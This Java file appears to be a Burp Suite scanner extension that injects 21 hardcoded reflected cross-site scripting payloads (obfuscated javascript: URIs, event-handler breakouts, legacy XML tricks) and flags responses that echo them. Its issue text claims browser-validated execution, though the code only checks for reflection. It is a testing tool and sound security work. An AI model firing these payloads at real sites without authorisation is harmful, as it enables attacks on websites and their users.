package burp;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BurpExtender implements IBurpExtender, IScannerInsertionPointProvider, IScannerCheck
{
    public IBurpExtenderCallbacks mCallbacks;
    private IExtensionHelpers     helpers;
    IBurpExtenderCallbacks cc = null;
    private PrintWriter           stdout;
    private PrintWriter           stderr;
    private String [][] payloads = new String[50][2];
    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)
    {
    	payloads[0][0] = "<img id=XSS SRC=x onerror=alert(XSS);>"; payloads[0][1] = "<img id=XSS SRC=x onerror=alert(XSS);>";
    	payloads[1][0] = "<IMG id=XSS SRC=\"javascript:alert('XSS');\">"; payloads[1][1] = "SRC=\"javascript:alert('XSS');\"";
    	payloads[2][0] = "<IMG id=XSS SRC=javascript:alert('XSS')>"; payloads[2][1] = "<IMG id=XSS SRC=javascript:alert('XSS')>";
    	payloads[3][0] = "<IMG id=XSS SRC=javascript:alert(&quot;XSS&quot;)>"; payloads[3][1] = "<IMG id=XSS SRC=javascript:alert(&quot;XSS&quot;)>";
    	payloads[4][0] = "<IMG id=XSS SRC=`javascript:alert(\"'XSS'\")`>"; payloads[4][1] = "<IMG id=XSS SRC=`javascript:alert(\"'XSS'\")`>";
    	payloads[5][0] = "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"; payloads[5][1] = "<SCRIPT>alert(\"XSS\")</SCRIPT>";
    	payloads[6][0] = "<IMG id=XSS SRC=\"jav   ascript:alert('XSS');\">"; payloads[6][1] = "<IMG id=XSS SRC=\"javascript:alert('XSS');\">";
    	payloads[7][0] = "<IMG id=XSS SRC=\"jav&#x09;ascript:alert('XSS');\">"; payloads[7][1] = "<IMG id=XSS SRC=\"javascript:alert('XSS');\">";
    	payloads[8][0] = "<IMG id=XSS SRC=\"jav&#x0A;ascript:alert('XSS');\">"; payloads[8][1] = "<IMG id=XSS SRC=\"javascript:alert('XSS');\">";
    	
    	payloads[9][0] = "<IMG id=XSS SRC=\"jav&#x0D;ascript:alert('XSS');\">"; payloads[9][1] = "<IMG id=XSS SRC=\"javascript:alert('XSS');\">";
    	payloads[10][0] = "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>"; payloads[10][1] = "<SCRIPT>alert(\"XSS\")</SCRIPT>";
    	payloads[11][0] = "<IMG id=XSS SRC='javascript:alert('XSS')"; payloads[11][1] = "<IMG id=XSS SRC='javascript:alert('XSS')";
    	payloads[12][0] = "<BGSOUND id=XSS SRC=\"javascript:alert('XSS');\">"; payloads[12][1] = "<BGSOUND id=XSS SRC=\"javascript:alert('XSS')";
    	payloads[13][0] = "<XML id=XSS><X><C><![CDATA[<IMG id=XSS SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]></C></X><xml><SPAN DATAid=XSS SRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>"; payloads[13][1] = "javascript:alert('XSS')";
    	payloads[14][0] = "<XML ID=\"XSS\"><I><B>&lt;IMG id=XSS SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></XML><SPAN DATAid=XSS SRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>"; payloads[14][1] = "javascript:alert('XSS')";
    	payloads[15][0] = "<XML id=XSS SRC=\"xsstest.xml\" ID=I></XML><SPAN DATAid=XSS SRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"; payloads[15][1] = "\"xsstest.xml\"";
    	payloads[16][0] = "<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"></BODY></HTML>"; payloads[16][1] = "alert(\"XSS\")";
    	
    	
    	payloads[17][0] = "\" onfocus=alert(XSS) \"> <\""; payloads[17][1] = "\" onfocus=alert(XSS) \"";
    	payloads[18][0] = "\" onblur=alert(XSS) \"> <\""; payloads[18][1] = "\" onblur=alert(XSS) \"";
    	payloads[19][0] = "\" onmouseover=alert(XSS) \">"; payloads[19][1] = "\" onmouseover=alert(XSS) \"";
    	payloads[20][0] = "\" onclick=alert(XSS) \">"; payloads[20][1] = "\" onclick=alert(XSS) \"";
    	
    	
    	
        cc = callbacks;
        this.mCallbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("@vah_13_meduZa");
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stderr = new PrintWriter(callbacks.getStderr(), true);
        callbacks.registerScannerCheck(this);
    }

    
	@Override
	public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
			IScannerInsertionPoint insertionPoint) {
		// TODO Auto-generated method stub
		
		for (int i = 0; i<21;i++){
           boolean vulnerable = false;
	
           byte[] checkRequest = insertionPoint.buildRequest(payloads[i][0].getBytes());
	       IHttpRequestResponse messageInfo = mCallbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
	       String[] requestInfo = fetchRequestVals(messageInfo.getRequest(), messageInfo.getHttpService().getProtocol());

	       
           String response = this.helpers.bytesToString(messageInfo.getResponse()).toLowerCase();
           
           
           if(response.contains(payloads[i][1].toLowerCase())){
        	   
        	   stdout.println("*********************************************************");
        	   stdout.println("found " + payloads[i][0]);
        	   stdout.println("---------------------------------------------------------");
           	   stdout.println(response);
           	   stdout.println("*********************************************************");
           	   stdout.println("\n\n\n\n");
           
               List<int[]> matches = getMatches(messageInfo.getResponse(), payloads[i][1].getBytes());
	           List<int[]> requestHighlights = new ArrayList<>(1);
	           requestHighlights.add(insertionPoint.getPayloadOffsets(payloads[i][0].getBytes()));
	           // report the issue
	           List<IScanIssue> issues = new ArrayList<>(1);
	           /*
	           stdout.println(baseRequestResponse.getHttpService());
	           stdout.println(helpers.analyzeRequest(baseRequestResponse).getUrl());
	           stdout.println(messageInfo);*/
	           try{
	           issues.add(new CustomScanIssue(
	                   baseRequestResponse.getHttpService(),
	                   helpers.analyzeRequest(baseRequestResponse).getUrl(), 
	                   new IHttpRequestResponse[] { mCallbacks.applyMarkers(messageInfo, requestHighlights, matches) }, 
	                   "Cross-Site Scripting (@vah_13_meduZa)",
	                   "@vah_13_meduZa has determined that the application is vulnerable to reflected Cross-Site Scripting by injecting " +
	                   "the payload into the application successfully. When executed within a scriptable browser " +
	                   "the payload was found to execute, validating the vulnerability.",
	                   "High"));
	           }
	           catch(Exception ex){
	        	   stdout.println(ex.getMessage());
	        	   stdout.println(issues);
	           }
	           return issues;
           }
		}

	    	PrintWriter stdout = new PrintWriter(cc.getStdout(), true);
	    	stdout.println("Hello output");


	        return null;
	}
	
	private List<int[]> getMatches(byte[] response, byte[] match)
	    {
	        List<int[]> matches = new ArrayList<int[]>();

	        int start = 0;
	        while (start < response.length)
	        {
	            start = helpers.indexOf(response, match, true, start, response.length);
	            if (start == -1)
	                break;
	            matches.add(new int[] { start, start + match.length });
	            start += match.length;
	        }
	        
	        return matches;
	    }

    public String[] fetchRequestVals(byte[] intruderRequest, String proto) {
        String request = this.helpers.bytesToString(intruderRequest);

        String urlPattern = "(GET|POST) (.*) H";
        String hostPattern = "Host: (.*)";
        Pattern url = Pattern.compile(urlPattern);
        Pattern host = Pattern.compile(hostPattern);
        Matcher urlMatcher = url.matcher(request);
        Matcher hostMatcher = host.matcher(request);


        String intruderUrl = "";
        String intruderHost = "";

        // Find specific values
        while (urlMatcher.find()) {
            intruderUrl = urlMatcher.group(2); 
        }

        while(hostMatcher.find()) {
            intruderHost = hostMatcher.group(1);
        }

        intruderUrl = proto + "://" + intruderHost + intruderUrl;

        String[] requestVals = new String[2];
        requestVals[0] = intruderUrl;
        requestVals[1] = request;
        return requestVals;
    }
	
    @Override
	public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
		// TODO Auto-generated method stub
		return 0;
	}

	@Override
	public List<IScannerInsertionPoint> getInsertionPoints(IHttpRequestResponse baseRequestResponse) {
		// TODO Auto-generated method stub
		return null;
	}

	class CustomScanIssue implements IScanIssue
	{
	    private IHttpService httpService;
	    private URL url;
	    private IHttpRequestResponse[] httpMessages;
	    private String name;
	    private String detail;
	    private String severity;

	    public CustomScanIssue(
	            IHttpService httpService,
	            URL url, 
	            IHttpRequestResponse[] httpMessages, 
	            String name,
	            String detail,
	            String severity)
	    {
	        this.httpService = httpService;
	        this.url = url;
	        this.httpMessages = httpMessages;
	        this.name = name;
	        this.detail = detail;
	        this.severity = severity;
	    }
	    
	    @Override
	    public URL getUrl()
	    {
	        return url;
	    }

	    @Override
	    public String getIssueName()
	    {
	        return name;
	    }

	    @Override
	    public int getIssueType()
	    {
	        return 0;
	    }

	    @Override
	    public String getSeverity()
	    {
	        return severity;
	    }

	    @Override
	    public String getConfidence()
	    {
	        return "Certain";
	    }

	    @Override
	    public String getIssueBackground()
	    {
	        return null;
	    }

	    @Override
	    public String getRemediationBackground()
	    {
	        return null;
	    }

	    @Override
	    public String getIssueDetail()
	    {
	        return detail;
	    }

	    @Override
	    public String getRemediationDetail()
	    {
	        return null;
	    }

	    @Override
	    public IHttpRequestResponse[] getHttpMessages()
	    {
	        return httpMessages;
	    }

	    @Override
	    public IHttpService getHttpService()
	    {
	        return httpService;
	    }   

}}